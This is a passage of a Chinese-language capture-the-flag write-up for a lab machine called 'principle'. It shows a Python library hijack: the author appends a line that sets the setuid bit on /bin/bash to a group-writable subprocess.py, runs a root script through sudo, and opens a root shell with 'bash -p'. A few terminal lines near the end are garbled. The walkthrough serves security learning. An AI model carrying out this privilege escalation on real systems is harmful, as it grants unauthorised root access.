        ip, ipcalc, ipneigh, kill, killall, klogd, last, less, link, linux32, linux64, linuxrc, ln, loadfont, loadkmap, logger, login, logname,
        logread, losetup, ls, lsmod, lsscsi, lzcat, lzma, lzop, md5sum, mdev, microcom, mim, mkdir, mkdosfs, mke2fs, mkfifo, mknod, mkpasswd, mkswap,
        mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc, netstat, nl, nologin, nproc, nsenter, nslookup, nuke, od, openvt, partprobe, paste,
        patch, pidof, ping, ping6, pivot_root, poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice, reset, resume, rev, rm, rmdir,
        rmmod, route, rpm, rpm2cpio, run-init, run-parts, sed, seq, setkeycodes, setpriv, setsid, sh, sha1sum, sha256sum, sha3sum, sha512sum, shred,
        shuf, sleep, sort, ssl_client, start-stop-daemon, stat, strings, stty, svc, svok, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac,
        tail, tar, taskset, tee, telnet, test, tftp, time, timeout, top, touch, tr, traceroute, traceroute6, true, truncate, ts, tty, ubirename,
        udhcpc, udhcpd, uevent, umount, uname, uncompress, unexpand, uniq, unix2dos, unlink, unlzma, unshare, unxz, unzip, uptime, usleep, uudecode,
        uuencode, vconfig, vi, w, watch, watchdog, wc, wget, which, who, whoami, xargs, xxd, xz, xzcat, yes, zcat
elohim@principle:~$ busybox cat flag.txt
                           _
                          _)\.-.
         .-.__,___,_.-=-. )\`  a`\_
     .-.__\__,__,__.-=-. `/  \     `\
     {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
      \-,~_-~_-,~-,(_(_(;\/   ,;/
       ",-.~_,-~,-~,)_)_)'.  ;;(
         `~-,_-~,-~(_(_(_(_\  `;\
   ,          `"~~--,)_)_)_)\_   \
   |\              (_(_/_(_,   \  ;
   \ '-.       _.--'  /_/_/_)   | |
    '--.\    .'          /_/    | |
        ))  /       \      |   /.'
       //  /,        | __.'|  ||
      //   ||        /`    (  ||
     ||    ||      .'       \ \\
     ||    ||    .'_         \ \\
      \\   //   / _ `\        \ \\__
       \'-'/(   _  `\,;        \ '--:,
        `"`  `"` `-,,;         `"`",,;


CONGRATULATIONS, you have defeated me!

The flag is:
K|tW4bw7$zNh'PwSh/jN
                                                                               
Broadcast message from root@principle (somewhere) (Sun Apr 21 09:05:01 2024):  
                                                                               
I have detected an intruder, stealing accounts: elohim
                                                                               
^C
elohim@principle:~$ busybox cat /opt/reviewer.py
#!/usr/bin/python3

import os
import subprocess

def eliminar_archivos_incorrectos(directorio):
    extensiones_validas = ['.jpg', '.png', '.gif']
    
    for nombre_archivo in os.listdir(directorio):
        archivo = os.path.join(directorio, nombre_archivo)
        
        if os.path.isfile(archivo):
            _, extension = os.path.splitext(archivo)
            
            if extension.lower() not in extensiones_validas:
                os.remove(archivo)
                print(f"Archivo eliminado: {archivo}")

directorio = '/var/www/hellfire.t4l0s.hmv/archivos'

eliminar_archivos_incorrectos(directorio)

def enviar_mensaje_usuarios_conectados():
    proceso = subprocess.Popen(['who'], stdout=subprocess.PIPE)
    salida, _ = proceso.communicate()
    lista_usuarios = salida.decode().strip().split('\n')
    usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios]
    mensaje = f"I have detected an intruder, stealing accounts: {', '.join(usuarios_conectados)}"
    subprocess.run(['wall', mensaje])

enviar_mensaje_usuarios_conectados()
```

好复杂，看一下他用的两个口库：

```bash
elohim@principle:~$ python3 -V
Python 3.11.2
elohim@principle:~$ ls -al /usr/lib/python3.11/os.py
-rw-r--r-- 1 root root 39504 Mar 13  2023 /usr/lib/python3.11/os.py
elohim@principle:~$ ls -al /usr/lib/python3.11/subprocess.py
-rw-rw-r-- 1 root sml 85745 Jul 11  2023 /usr/lib/python3.11/subprocess.py
elohim@principle:~$ id
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
```

正好我们可以修改其中一个！！

```bash
echo 'import os; os.system("chmod +s /bin/bash")' >> /usr/lib/python3.11/subprocess.py
```

然后拿下flag！！！

```bash
elohim@principle:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash                                               echo 'import os; os.system("chmod +s /bin/bash")' >> /usr/lib/python3.11/subprocess.pys; os.system("chmod +s /bin/bash")' >> /usr/lib/python3.11/subprocess.py
elohim@principle:~$ sudo python3 /opt/reviewer.py
                                                                               
Broadcast message from root@principle (pts/3) (Sun Apr 21 09:11:20 2024):      
                                                                               
I have detected an intruder, stealing accounts: elohim, elohim
                                                                               
                                                                               
Broadcast message from root@principle (pts/3) (Sun Apr 21 09:11:20 2024):      
                                                                               
I have detected an intruder, stealing accounts: elohim, elohim
                                                                               
elohim@principle:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
elohim@principle:~$ /bin/bash -p
bash-5.2# whoami;id
root
uid=1001(elohim) gid=1001(elohim) euid=0(root) egid=0(root) groups=0(root),1001(elohim),1002(sml)
bash-5.2# cd /root
bash-5.2# ls -la
total 40
drwx------  5 root root 4096 Jul 14  2023 .
drwxr-xr-x 18 root root 4096 Jul 11  2023 ..
-rw-------  1 root root    0 Jul 14  2023 .bash_history
-rw-r--r--  1 root root  597 Jul  7  2023 .bashrc
drwx------  3 root root 4096 Jul  3  2023 .config
-rw-------  1 root root   20 Jul  6  2023 .lesshst
drwxr-xr-x  3 root root 4096 Jun 30  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root  478 Jul  7  2023 root.txt
-rw-r--r--  1 root root   66 Jul  6  2023 .selected_editor
drwx------  2 root root 4096 Jul 13  2023 .ssh
bash-5.2# cat root.txt 
CONGRATULATIONS, the system has been pwned!

          _______
        @@@@@@@@@@@
      @@@@@@@@@@@@@@@
     @@@@@@@222@@@@@@@
    (@@@@@/_____\@@@@@)
     @@@@(_______)@@@@
      @@@{ " L " }@@@
       \@  \ - /  @/
        /    ~    \
      / ==        == \
    <      \ __ /      >
   / \          |    /  \
 /    \       ==+==       \
|      \     ___|_         |
| \//~~~|---/ * ~~~~  |     }
{  /|   |-----/~~~~|  |    /
 \_ |  /           |__|_ /


+wP"y8z3TcDqO!&a*rg/
```

